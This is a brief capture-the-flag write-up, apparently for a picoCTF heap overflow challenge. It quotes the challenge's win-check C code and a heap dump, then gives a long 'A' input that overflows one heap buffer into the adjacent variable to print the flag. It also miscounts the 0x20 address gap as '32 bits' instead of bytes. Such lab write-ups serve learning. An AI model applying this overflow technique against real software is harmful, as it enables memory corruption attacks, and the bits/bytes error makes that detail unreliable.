1. Download the C code to check wining criteria
2. From the code  identifies that the safe_var have to be different then "bico": 
    void check_win() {
        if (strcmp(safe_var, "bico") != 0) {
            printf("\nYOU WIN\n");

            // Print flag
            char buf[FLAGSIZE_MAX];
            FILE *fd = fopen("flag.txt", "r");
            fgets(buf, FLAGSIZE_MAX, fd);
            printf("%s\n", buf);
            fflush(stdout);

            exit(0);
        } else {
            printf("Looks like everything is still secure!\n");
            printf("\nNo flage for you :(\n");
            fflush(stdout);
        }
    }
3. Identify the address for save value in option 1. 
    Here we see that : 
    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data   
    +-------------+----------------+
    [*]   0x5864b5fdc2b0  ->   pico
    +-------------+----------------+
    [*]   0x5864b5fdc2d0  ->   bico
    +-------------+----------------+

    DIfference between adresses is 32 bits. First adress is at 2b0 and second is at 2d0
    Between 2b0 and 2c0 are 16 bits ( 0 to 9 and A to F) and from 2c0 and 2d0 are also 16
4. Using option 3 in menu, send the buffer with more then 32 characters as: 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa
5. Get the flag with option 4
